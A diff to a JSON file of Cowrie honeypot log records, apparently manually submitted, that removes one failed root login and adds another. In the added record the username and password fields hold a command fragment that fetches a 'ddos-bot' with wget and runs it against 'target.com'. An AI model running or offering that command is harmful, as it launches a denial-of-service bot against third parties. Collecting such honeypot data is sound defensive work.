@@ -5,18 +5,6 @@
         "eventid": "cowrie.login.failed",
         "src_ip": "8.8.8.8",
         "username": "root",
-        "password": "password3",
-        "timestamp": "2026-03-29T17:28:22.278216",
-        "submitted_at": "2026-03-29T17:28:22.278236",
-        "source": "manual_submission"
-      },
-      "submitted_at": "2026-03-29T17:28:22.278236"
-    },
-    {
-      "log": {
-        "eventid": "cowrie.login.failed",
-        "src_ip": "8.8.8.8",
-        "username": "root",
         "password": "password4",
         "timestamp": "2026-03-29T17:28:23.472324",
         "submitted_at": "2026-03-29T17:28:23.472342",
@@ -599,6 +587,18 @@
         "source": "manual_submission"
       },
       "submitted_at": "2026-04-08T09:36:23.305433"
+    },
+    {
+      "log": {
+        "eventid": "cowrie.login.failed",
+        "src_ip": "149.28.100.50",
+        "username": "\"wget",
+        "password": "github.com/ddos-bot && ./bot 1000 target.com\"",
+        "timestamp": "2026-04-08T09:40:50.873557",
+        "submitted_at": "2026-04-08T09:40:50.873597",
+        "source": "manual_submission"
+      },
+      "submitted_at": "2026-04-08T09:40:50.873597"
     }
   ]
 }
